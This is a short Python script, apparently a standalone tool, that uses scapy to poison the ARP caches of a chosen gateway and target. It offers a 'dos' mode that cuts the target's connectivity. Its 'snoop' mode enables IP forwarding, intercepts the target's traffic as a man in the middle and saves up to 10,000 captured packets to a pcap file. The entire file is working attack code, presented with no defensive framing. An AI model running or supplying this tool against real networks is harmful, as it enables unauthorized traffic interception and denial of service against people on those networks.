from scapy.all import *
import sys
import os
import threading


def usage():
    print("Usage: arpp.py {gateway_ip} {target_ip} [dos/snoop]")
    sys.exit(0)

def mac(ip):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

def restore(gip, gmac, tip, tmac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gip, hwsrc=tmac, psrc=tip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=tip, hwsrc=gmac, psrc=gip), count=5)

def spoof(gip,gmac,tip,tmac,event):
    while event.is_set():
        send(ARP(op=2, pdst=gip, hwdst=gmac, psrc=tip))
        send(ARP(op=2, pdst=tip, hwdst=tmac, psrc=gip))
        time.sleep(2)

def dos(gip, gmac, tip, tmac, event):
    spoof(gip,gmac,tip,tmac,event)

def listen(gip, gmac, tip, tmac, event):
    os.system("sysctl -w net.ipv4.ip_forward=1")
    spoof(gip,gmac,tip,tmac,event)
    os.system("sysctl -w net.ipv4.ip_forward=0")

def main():
    if (len(sys.argv) != 4):
        usage()
    gateway_ip = sys.argv[1]
    target_ip = sys.argv[2]
    cmd = sys.argv[3]
    gateway_mac = mac(gateway_ip)
    if gateway_mac is None:
        print("Could not find gateway MAC address. Exiting.")
        sys.exit(0)
    target_mac = mac(target_ip)
    if target_mac is None:
        print("Could not find target MAC address. Exiting.")
        sys.exit(0)
    event = threading.Event()
    event.set()
    if cmd == "dos":
        dos_thread = threading.Thread(target=dos, args=(gateway_ip,gateway_mac,target_ip,target_mac,event))
        dos_thread.start()
        try:
            while True:
                time.sleep(.1)
        except KeyboardInterrupt:
            event.clear()
            dos_thread.join()
            restore(gateway_ip,gateway_mac,target_ip,target_mac)
            sys.exit(0)
    elif cmd == "snoop":
        listen_thread = threading.Thread(target=listen, args=(gateway_ip,gateway_mac,target_ip,target_mac,event))
        listen_thread.start()
        try:
            sniff_filter = "ip host " + target_ip
            pkts = sniff(filter=sniff_filter,count=10000)
            wrpcap(target_ip + ".pcap",pkts)
            event.clear()
            listen_thread.join()
            restore(gateway_ip,gateway_mac,target_ip,target_mac)
            sys.exit(0)
        except KeyboardInterrupt:
            event.clear()
            listen_thread.join()
            restore(gateway_ip,gateway_mac,target_ip,target_mac)
            sys.exit(0)
    else:
        usage()

if (__name__ == '__main__'):
    main()